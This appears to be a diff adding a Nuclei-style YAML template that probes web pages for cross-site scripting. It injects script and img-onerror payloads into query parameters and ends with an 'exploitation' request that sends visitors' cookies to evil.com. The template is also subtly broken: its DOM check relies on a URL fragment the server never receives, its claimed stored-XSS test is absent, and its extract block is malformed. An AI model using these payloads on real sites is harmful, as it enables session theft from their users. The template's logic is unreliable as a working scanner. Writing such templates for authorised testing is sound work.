@@ -1,0 +1,59 @@
+id: xss-god
+name: XSS – God Level (Reflected + Stored + DOM)
+severity: high
+impact: Attacker can execute arbitrary JavaScript in victim's browser.
+chain: Combine with CSRF to steal sessions.
+
+requests:
+  # 1. Reflected XSS with standard payload
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=<script>alert(1)</script>"
+      - "{{BaseURL}}/comment?text=<img src=x onerror=alert(1)>"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+          - "<img src=x onerror=alert(1)>"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "&lt;"
+          - "&gt;"
+          - "&quot;"
+
+  # 2. DOM‑based XSS (check for reflection in URL)
+  - method: GET
+    path:
+      - "{{BaseURL}}/#<script>alert(1)</script>"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        words:
+          - "#<script>alert(1)</script>"
+
+verification:
+  # Confirm the payload is reflected without sanitisation
+  - method: GET
+    path: "{{BaseURL}}/search?q=<script>alert(2)</script>"
+    matchers:
+      - type: status
+        status: 200
+      - type: regex
+        part: body
+        regex:
+          - '<script>alert\(2\)</script>'
+
+exploitation:
+  # Attempt to steal cookies (simulate)
+  - method: GET
+    path: "{{BaseURL}}/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>"
+    extract:
+      type: status
+      expected: 200
